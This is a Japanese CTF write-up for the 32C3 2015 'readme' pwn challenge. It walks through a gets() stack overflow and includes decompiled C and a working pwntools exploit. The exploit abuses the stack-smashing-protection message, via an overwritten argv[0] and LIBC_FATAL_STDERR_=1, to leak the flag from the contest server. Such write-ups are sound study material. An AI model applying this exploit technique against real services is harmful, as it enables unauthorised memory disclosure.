---
layout: post
alias: "/blog/2016/01/02/32c3-ctf-readme/"
title: "32C3 CTF readme"
date: 2016-01-02T23:20:13+09:00
tags: [ "ctf", "writeup", "pwn", "xinetd", "buffer-overflow", "stack-smashing-protection" ]
---

手decompileした結果を眺めてみて、flagを取り出す方法が分からなかったので、他人のwriteupを見て解いた。初心者が初見で解くのはつらい問題だと感じる。

## [pwn 200: readme](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200)

>   Can you [read]() the flag?  
>   >   nc 136.243.194.62 1024

入力が2回あるバイナリ。1回目の入力にstack上のbuffer overflowがある。ただしsspがある。

``` sh
$ ./readme.bin
Hello!
What's your name? XXX
Nice to meet you, XXX.
Please overwrite the flag: YYY
Thank you, bye!

$ checksec --file readme.bin
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   readme.bin

$ perl -e 'print "X"x300,$/, "X",$/' | ./readme.bin
Hello!
What's your name? Nice to meet you, XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: ./readme.bin terminated
======= Backtrace: =========
/usr/lib/libc.so.6(+0x72055)[0x7fdb53982055]
/usr/lib/libc.so.6(__fortify_fail+0x37)[0x7fdb53a095d7]
/usr/lib/libc.so.6(__fortify_fail+0x0)[0x7fdb53a095a0]
./readme.bin[0x4008ae]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:02 5252127                            /home/user/readme.bin
...
```

decompileすると以下のようになっている。

``` c
#include <stdio.h>
#include <stdlib.h>
int canary = 0; // randomized?
char flag[] = "32C3_TheServerHasTheFlagHere\x2e\x2e\x2e";
void func(void) {
    char buf[0x118];
    buf[0x108] = canary;
    __printf_chk(1, "Hello!\nWhat's your name? ");
    if (gets(buf) == NULL) {
        exit(1);
    }
    __printf_chk(1, "Nice to meet you, %s.\nPlease overwrite the flag: ", buf);
    for (register int i = 0; i < 20; ++i) {
        register int c = getc(stdin);
        switch (c) {
            case EOF:
                exit(1);
            case '\n':
                memset(flag + i, 0, 0x20 - i);
                break;
            default:
                flag[i] = c;
        }
    }
    puts("Thank you, bye!");
    /* canary check */
    if (buf[0x108] != canary) {
        __stack_chk_fail();
    }
}
int main(void) {
    setbuf(stdout, NULL);
    func();
    return 0;
}
```

他のwriteup曰く、

-   sspによる`*** stack smashing detected ***: ./readme.bin terminated`によって`argv[0]`の値を表示できるので、これを書き換える。
-   上の出力は端末に直接吐かれるが、環境変数`LIBC_FATAL_STDERR_=1`と指定しておくと標準エラー出力に流れてきて、network越しでも見えるようになる。
-   flagは`.data` sectionである`0x600d20`にあり、後に上書きされるが、`0x400d20`にも書き込まれている。

ということなので、その通りにやればflagが出てくる。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools

import argparse
parser = argparse.ArgumentParser()
parser.add_argument('--local', action='store_true')
args = parser.parse_args()

context.log_level = 'debug'
if args.local:
    p = process('./readme.bin')
else:
    p = remote('136.243.194.62', 1024)

p.sendline(
    'X' * 0x210 # ($rsp at 0x4006ee, entry point) - ($rsp at 0x40080e, before gets)
    + p64(1) # argc
    + p64(0x400d20) # argv[0] <- flag
    + p64(0x0) # argv sentinel
    + p64(0x600d20) # envp[0] <- overwritten flag
    )
p.sendline('LIBC_FATAL_STDERR_=1')
p.recvall()
```

[Gallopsled/pwntools](https://github.com/Gallopsled/pwntools)というのを教えてもらったので使ってみた。

### 参考

-   <https://nuc13us.wordpress.com/2015/12/31/32c3-ctf-pwn-200-readme/>
-   <http://nandynarwhals.org/2015/12/31/32c3ctf-readme-pwn200/>
-   <http://stackoverflow.com/questions/4290336/how-to-redirect-runtime-errors-to-stderr>
-   <http://softwaretechnique.jp/OS_Development/Supplement/Binary/elf_stack.html>
